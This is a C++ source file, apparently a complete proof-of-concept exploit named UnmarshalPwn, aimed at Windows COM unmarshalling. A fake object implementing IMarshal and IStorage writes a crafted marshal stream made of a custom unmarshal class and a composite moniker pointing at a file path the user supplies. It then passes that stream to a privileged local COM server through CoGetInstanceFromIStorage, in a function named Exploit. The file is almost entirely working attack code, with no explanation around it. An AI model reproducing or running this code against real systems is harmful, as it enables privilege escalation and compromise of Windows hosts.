// UnmarshalPwn.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <stdio.h>
#include <tchar.h>
#include <string>
#include <comdef.h>
#include <winternl.h>
#include <ole2.h>
#include <Shlwapi.h>
#include <strsafe.h>
#include <vector>
#include <stdlib.h>

#pragma comment(lib, "shlwapi.lib")

GUID marshalInterceptorGUID = { 0xecabafcb,0x7f19,0x11d2,{ 0x97,0x8e,0x00,0x00,0xf8,0x75,0x7e,0x2a } };
GUID compositeMonikerGUID = { 0x00000309,0x0000,0x0000,{ 0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46 } };
UINT header[] = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
UINT monikers[] = { 0x02,0x00,0x00,0x00 };
GUID newMonikerGUID = { 0xecabafc6,0x7f19,0x11d2,{ 0x97,0x8e,0x00,0x00,0xf8,0x75,0x7e,0x2a } };
GUID random;
OLECHAR* randomString;

static bstr_t IIDToBSTR(REFIID riid)
{
	LPOLESTR str;
	bstr_t ret = "Unknown";
	if (SUCCEEDED(StringFromIID(riid, &str)))
	{
		ret = str;
		CoTaskMemFree(str);
	}
	return ret;
}

unsigned char const* GuidToByteArray(GUID const& g)
{
	return reinterpret_cast<unsigned char const*>(&g);
}

class FakeObject : public IMarshal, public IStorage
{
	LONG m_lRefCount;
	IStoragePtr _stg;
	wchar_t *pFilePath = NULL;

public:
	//Constructor, Destructor
	FakeObject(IStoragePtr storage, wchar_t *pValue) {
		_stg = storage;
		m_lRefCount = 1;
		pFilePath = pValue;
	}

	~FakeObject() {};

	//IUnknown
	HRESULT __stdcall QueryInterface(REFIID riid, LPVOID *ppvObj)
	{
		if (riid == __uuidof(IUnknown))
		{
			printf("Query for IUnknown\n");
			*ppvObj = this;
		}
		else if (riid == __uuidof(IStorage))
		{
			printf("Query for IStorage\n");
			*ppvObj = static_cast<IStorage*>(this);
		}
		else if (riid == __uuidof(IMarshal))
		{
			printf("Query for IMarshal\n");
			*ppvObj = static_cast<IMarshal*>(this);
		}
		else
		{
			printf("Unknown IID: %ls %p\n", IIDToBSTR(riid).GetBSTR(), this);
			*ppvObj = NULL;
			return E_NOINTERFACE;
		}

		((IUnknown*)*ppvObj)->AddRef();
		return NOERROR;
	}

	ULONG __stdcall AddRef()
	{
		return InterlockedIncrement(&m_lRefCount);
	}

	ULONG __stdcall Release()
	{
		ULONG  ulCount = InterlockedDecrement(&m_lRefCount);

		if (0 == ulCount)
		{
			delete this;
		}

		return ulCount;
	}

	virtual HRESULT STDMETHODCALLTYPE CreateStream(
		/* [string][in] */ __RPC__in_string const OLECHAR *pwcsName,
		/* [in] */ DWORD grfMode,
		/* [in] */ DWORD reserved1,
		/* [in] */ DWORD reserved2,
		/* [out] */ __RPC__deref_out_opt IStream **ppstm) {
		printf("Call: CreateStream\n");
		return _stg->CreateStream(pwcsName, grfMode, reserved1, reserved2, ppstm);

	}

	virtual /* [local] */ HRESULT STDMETHODCALLTYPE OpenStream(
		/* [annotation][string][in] */
		_In_z_  const OLECHAR *pwcsName,
		/* [annotation][unique][in] */
		_Reserved_  void *reserved1,
		/* [in] */ DWORD grfMode,
		/* [in] */ DWORD reserved2,
		/* [annotation][out] */
		_Outptr_  IStream **ppstm) {
		printf("Call: OpenStream\n");
		_stg->OpenStream(pwcsName, reserved1, grfMode, reserved2, ppstm);
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE CreateStorage(
		/* [string][in] */ __RPC__in_string const OLECHAR *pwcsName,
		/* [in] */ DWORD grfMode,
		/* [in] */ DWORD reserved1,
		/* [in] */ DWORD reserved2,
		/* [out] */ __RPC__deref_out_opt IStorage **ppstg) {
		printf("Call: CreateStorage\n");
		_stg->CreateStorage(pwcsName, grfMode, reserved1, reserved2, ppstg);
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE OpenStorage(
		/* [string][unique][in] */ __RPC__in_opt_string const OLECHAR *pwcsName,
		/* [unique][in] */ __RPC__in_opt IStorage *pstgPriority,
		/* [in] */ DWORD grfMode,
		/* [unique][in] */ __RPC__deref_opt_in_opt SNB snbExclude,
		/* [in] */ DWORD reserved,
		/* [out] */ __RPC__deref_out_opt IStorage **ppstg) {
		printf("Call: OpenStorage\n");
		_stg->OpenStorage(pwcsName, pstgPriority, grfMode, snbExclude, reserved, ppstg);
		return S_OK;
	}

	virtual /* [local] */ HRESULT STDMETHODCALLTYPE CopyTo(
		/* [in] */ DWORD ciidExclude,
		/* [annotation][size_is][unique][in] */
		_In_reads_opt_(ciidExclude)  const IID *rgiidExclude,
		/* [annotation][unique][in] */
		_In_opt_  SNB snbExclude,
		/* [annotation][unique][in] */
		_In_  IStorage *pstgDest) {
		printf("Call: CopyTo\n");
		_stg->CopyTo(ciidExclude, rgiidExclude, snbExclude, pstgDest);
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE MoveElementTo(
		/* [string][in] */ __RPC__in_string const OLECHAR *pwcsName,
		/* [unique][in] */ __RPC__in_opt IStorage *pstgDest,
		/* [string][in] */ __RPC__in_string const OLECHAR *pwcsNewName,
		/* [in] */ DWORD grfFlags) {
		printf("Call: MoveElementTo\n");
		_stg->MoveElementTo(pwcsName, pstgDest, pwcsNewName, grfFlags);
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE Commit(
		/* [in] */ DWORD grfCommitFlags) {
		printf("Call: Commit\n");
		_stg->Commit(grfCommitFlags);
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE Revert(void) {
		printf("Call:  Revert\n");
		return S_OK;
	}

	virtual /* [local] */ HRESULT STDMETHODCALLTYPE EnumElements(
		/* [annotation][in] */
		_Reserved_  DWORD reserved1,
		/* [annotation][size_is][unique][in] */
		_Reserved_  void *reserved2,
		/* [annotation][in] */
		_Reserved_  DWORD reserved3,
		/* [annotation][out] */
		_Outptr_  IEnumSTATSTG **ppenum) {
		printf("Call:  EnumElements\n");
		_stg->EnumElements(reserved1, reserved2, reserved3, ppenum);
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE DestroyElement(
		/* [string][in] */ __RPC__in_string const OLECHAR *pwcsName) {
		printf("Call:  DestroyElement\n");
		_stg->DestroyElement(pwcsName);
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE RenameElement(
		/* [string][in] */ __RPC__in_string const OLECHAR *pwcsOldName,
		/* [string][in] */ __RPC__in_string const OLECHAR *pwcsNewName) {
		printf("Call:  RenameElement\n");
		return S_OK;

	};

	virtual HRESULT STDMETHODCALLTYPE SetElementTimes(
		/* [string][unique][in] */ __RPC__in_opt_string const OLECHAR *pwcsName,
		/* [unique][in] */ __RPC__in_opt const FILETIME *pctime,
		/* [unique][in] */ __RPC__in_opt const FILETIME *patime,
		/* [unique][in] */ __RPC__in_opt const FILETIME *pmtime) {
		printf("Call:  SetElementTimes\n");
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE SetClass(
		/* [in] */ __RPC__in REFCLSID clsid) {
		printf("Call:  SetClass\n");
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE SetStateBits(
		/* [in] */ DWORD grfStateBits,
		/* [in] */ DWORD grfMask) {
		printf("Call:  SetStateBits\n");
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE Stat(
		/* [out] */ __RPC__out STATSTG *pstatstg,
		/* [in] */ DWORD grfStatFlag) {
		printf("Call:  Stat\n");
		HRESULT hr = 0;
		size_t len = 0;

		len = wcsnlen_s(randomString, MAX_PATH) + 1;
		PWCHAR s = (PWCHAR)CoTaskMemAlloc(len * sizeof(WCHAR));
		wcscpy_s(s, len, randomString);
		pstatstg[0].pwcsName = s;
		hr = _stg->Stat(pstatstg, grfStatFlag);
		printf("End:  Stat\n");
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][unique][in] */
		_In_opt_  void *pv,
		/* [annotation][in] */
		_In_  DWORD dwDestContext,
		/* [annotation][unique][in] */
		_Reserved_  void *pvDestContext,
		/* [annotation][in] */
		_In_  DWORD mshlflags,
		/* [annotation][out] */
		_Out_  CLSID *pCid)
	{
		printf("Call:  GetUnmarshalClass\n");
		*pCid = marshalInterceptorGUID; // ECABAFCB-7F19-11D2-978E-0000F8757E2A
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE GetMarshalSizeMax(
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][unique][in] */
		_In_opt_  void *pv,
		/* [annotation][in] */
		_In_  DWORD dwDestContext,
		/* [annotation][unique][in] */
		_Reserved_  void *pvDestContext,
		/* [annotation][in] */
		_In_  DWORD mshlflags,
		/* [annotation][out] */
		_Out_  DWORD *pSize)
	{
		printf("Call:  GetMarshalSizeMax\n");
		*pSize = 1024;
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE MarshalInterface(
		/* [annotation][unique][in] */
		_In_  IStream *pStm,
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][unique][in] */
		_In_opt_  void *pv,
		/* [annotation][in] */
		_In_  DWORD dwDestContext,
		/* [annotation][unique][in] */
		_Reserved_  void *pvDestContext,
		/* [annotation][in] */
		_In_  DWORD mshlflags)
	{
		printf("Call:  MarshalInterface\n");
		ULONG written = 0;
		HRESULT hr = 0;
		pStm->Write(header, 12, &written);
		pStm->Write(GuidToByteArray(marshalInterceptorGUID), 16, &written);

		IMonikerPtr fileMoniker;
		IMonikerPtr newMoniker;
		IBindCtxPtr context;

		pStm->Write(monikers, 4, &written);
		pStm->Write(GuidToByteArray(compositeMonikerGUID), 16, &written);
		pStm->Write(monikers, 4, &written);
		hr = CreateBindCtx(0, &context);
		hr = CreateFileMoniker(pFilePath, &fileMoniker);
		hr = CoCreateInstance(newMonikerGUID, NULL, CLSCTX_ALL, IID_IUnknown, (LPVOID*)&newMoniker);
		hr = OleSaveToStream(fileMoniker, pStm);
		hr = OleSaveToStream(newMoniker, pStm);
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE UnmarshalInterface(
		/* [annotation][unique][in] */
		_In_  IStream *pStm,
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][out] */
		_Outptr_  void **ppv)
	{
		printf("Call:  UnmarshalInterface\n");
		return E_NOTIMPL;
	}

	virtual HRESULT STDMETHODCALLTYPE ReleaseMarshalData(
		/* [annotation][unique][in] */
		_In_  IStream *pStm)
	{
		printf("Call:  ReleaseMarshalData\n");
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE DisconnectObject(
		/* [annotation][in] */
		_In_  DWORD dwReserved)
	{
		printf("Call: DisconnectObject\n");
		return S_OK;
	}
};

static HRESULT Check(HRESULT hr)
{
	if (FAILED(hr))
	{
		throw _com_error(hr);
	}
	return hr;
}

void Exploit(wchar_t *pValue)
{
	HRESULT hr = 0;
	IStoragePtr storage = nullptr;
	MULTI_QI* qi = new MULTI_QI[1];

	GUID target_GUID = { 0x7d096c5f,0xac08,0x4f1f,{ 0xbe,0xb7,0x5c,0x22,0xc5,0x17,0xce,0x39 } };
	hr = CoCreateGuid(&random);

	StringFromCLSID(random, &randomString);
	StgCreateDocfile(randomString, STGM_CREATE | STGM_READWRITE | STGM_SHARE_EXCLUSIVE, 0, &storage);

	IStoragePtr pFake = new FakeObject(storage, pValue);

	qi[0].pIID = &IID_IUnknown;
	qi[0].pItf = NULL;
	qi[0].hr = 0;

	CoGetInstanceFromIStorage(NULL, &target_GUID, NULL, CLSCTX_LOCAL_SERVER, pFake, 1, qi);

}

class CoInit
{
public:
	CoInit()
	{
		Check(CoInitialize(nullptr));
		Check(CoInitializeSecurity(nullptr, -1, nullptr, nullptr, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, NULL, nullptr));
	}

	~CoInit()
	{
		CoUninitialize();
	}
};


int wmain(int argc, wchar_t** argv)
{
	try
	{
		CoInit ci;

		Exploit(argv[1]);

	}
	catch (const _com_error& err)
	{
		printf("Error: %ls\n", err.ErrorMessage());
	}

	return 0;
}
